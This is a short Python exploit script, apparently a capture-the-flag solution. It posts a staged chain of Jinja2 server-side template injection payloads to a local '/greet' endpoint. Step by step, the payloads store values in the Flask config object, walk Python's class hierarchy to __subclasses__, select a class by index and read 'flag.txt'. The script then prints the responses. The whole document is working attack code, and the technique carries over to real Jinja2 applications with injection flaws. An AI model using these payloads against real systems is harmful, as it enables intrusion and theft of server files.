import requests
payloads = [
    '{{config.update({"u":config.update})}}',
    '{{config.u({"a":"".__class__.mro()})}}',
    '{{config.u({"b":"__subclasses__"})}}',
    '{{config.u({"c":config.a[1]})}}',
    '{{config.u({"d":config.c[config.b]})}}',
    '{{config.u({"e":config.d()[357]})}}',
    "{{config.e('flag.txt').read()}}"
]

for i in payloads:
    resp=requests.post("http://127.0.0.1:8000/greet",data={"comment":i})
    print(resp.content)
    if (b"werkzeug.routing.matcher.StateMachineMatcher" in resp.content):
        print(resp.content.find(b"werkzeug.routing.matcher.StateMachineMatcher"))
